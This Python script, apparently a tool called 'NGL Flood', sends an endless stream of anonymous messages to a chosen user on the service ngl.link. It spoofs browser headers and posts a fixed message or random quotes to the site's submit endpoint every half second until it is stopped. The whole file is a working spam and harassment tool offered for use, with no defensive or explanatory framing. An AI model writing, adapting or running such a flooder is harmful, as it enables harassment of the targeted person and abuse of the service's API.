import requests,time,random
from files.menu import *
from files.quotes import *

headers = {
    'Host': 'ngl.link',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'Accept': '*/*',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Origin': 'https://ngl.link',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Priority': 'u=1, i'
}

data = {
    'username': '',
    'question': '',
    'deviceId': '',
    'gameSlug': '',
    'referrer': ''
}

def main():
    username = get_info()
    data['deviceId'] = get_id(username)
    data['username'] = username
    quote = get_quote()
    url = 'https://ngl.link/api/submit'
    i = 1

    if quote == True:
        lang = language()
        if lang == 'english':
            words = en
        else:
            words = ptbr
    else:
        words = quote

    if type(words) in [str]:
        data['question'] = words
        print()
        print("\033[95m[+] fl00d st4rt ☠\033[0m")
        print()
        try:
            while True:
                r = requests.post(url, data=data, headers=headers)
                print(f"\033[95m[☠]\033[0m Request {i}: {r.status_code}")
                i += 1
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("Interrupted by user")
            exit(1)
    else:
        try:
            print()
            print("\033[95m[+] fl00d st4rt ☠\033[0m")
            print()
            while True:
                data['question'] = random.choice(words)
                r = requests.post(url, data=data, headers=headers)
                print(f"\033[95m[☠]\033[0m Request {i}, status code: {r.status_code}")
                i += 1
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("Interrupted by user")
            exit(1)

if __name__ == '__main__':
   print("\033[95m"
       """
 ███▄    █   ▄████  ██▓         █████▒██▓     ▒█████   ▒█████  ▓█████▄ 
 ██ ▀█   █  ██▒ ▀█▒▓██▒       ▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
▓██  ▀█ ██▒▒██░▄▄▄░▒██░       ▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▓██▒  ▐▌██▒░▓█  ██▓▒██░       ░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
▒██░   ▓██░░▒▓███▀▒░██████▒   ░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░▓  ░    ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
░ ░░   ░ ▒░  ░   ░ ░ ░ ▒  ░    ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ 
   ░   ░ ░ ░ ░   ░   ░ ░       ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ 
         ░       ░     ░  ░              ░  ░    ░ ░      ░ ░     ░    
                                                                ░      
         """
         "\033[0m")
   print(f"\033[95mby vt0x78 and L3ster ☠\033[0m")
   print()
   main()